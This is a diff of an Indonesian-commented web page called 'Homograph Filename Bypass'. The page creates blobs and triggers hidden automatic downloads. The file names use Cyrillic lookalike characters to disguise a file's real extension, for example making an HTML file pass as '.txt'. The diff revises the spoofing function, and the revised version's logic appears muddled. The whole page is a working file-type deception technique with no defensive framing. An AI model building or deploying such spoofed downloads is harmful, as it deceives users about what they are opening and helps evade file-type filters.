@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Homograph Filename Bypass</title>
+<title>Full Homograph Bypass</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; }
@@ -22,8 +22,8 @@ button:hover { background: #b71c1c; }
 
 <body>
 <div class="panel" id="main-panel">
-<h2>Homograph Filename Bypass</h2>
-<p>Menyamarkan ekstensi .html menggunakan huruf Cyrillic yang mirip dengan .txt.</p>
+<h2>Full Homograph Bypass</h2>
+<p>Menyamarkan ekstensi .html menggunakan karakter Unicode (Homograph).</p>
 
 <button id="start-btn" type="button">Mulai Generate Blob</button>
 <div id="status" role="status">Sistem siap.</div>
@@ -48,22 +48,18 @@ const speak = (message) => {
     }
 };
 
-// Fungsi untuk membuat nama file Homograph
+// Fungsi untuk membuat nama file Homograph (Full)
 function generateHomographFilename(baseName) {
-    // Karakter Cyrillic yang mirip dengan huruf Latin:
-    // 't' -> U+0442 (Cyrillic Small Letter Te)
-    // 'x' -> U+0445 (Cyrillic Small Letter Ha)
-    // 't' -> U+0442 (Cyrillic Small Letter Te)
+    // Karakter yang mirip:
+    // h -> U+04BB (Cyrillic Small Letter Shha)
+    // t -> U+0442 (Cyrillic Small Letter Te)
+    // m -> U+043C (Cyrillic Small Letter Em)
+    // l -> U+04CF (Cyrillic Small Letter Palochka)
     
-    const cyrillicT = "\u0442"; // Mirip 't'
-    const cyrillicX = "\u0445"; // Mirip 'x'
+    const fakeHtml = ".\u04BB\u0442\u043C\u04CF"; // .htm l (mirip .html)
     
-    // String ".txt" yang terlihat sama tapi berbeda di mata komputer
-    const fakeTxt = `.${cyrillicT}${cyrillicX}${cyrillicT}`;
-    
-    // Gabungkan: namafile + ".txt-palsu" + ".html"
-    // Visual: namafile.txt.html
-    return `${baseName}${fakeTxt}.html`;
+    // Format: namafile.txt.html-palsu
+    return `${baseName}.txt${fakeHtml}`;
 }
 
 const prepareMimeBlobAsync = (i) => {
@@ -151,7 +147,7 @@ const triggerInstantDownload = (fileData) => {
     // Terapkan Homograph Filename
     link.download = generateHomographFilename(`laporan-${fileData.id}`);
     
-    link.textContent = `Blob #${fileData.id} (Homograph)`;
+    link.textContent = `Blob #${fileData.id} (Full Homograph)`;
     link.style.display = "none";
     downloadsDiv.appendChild(link);
     link.click();
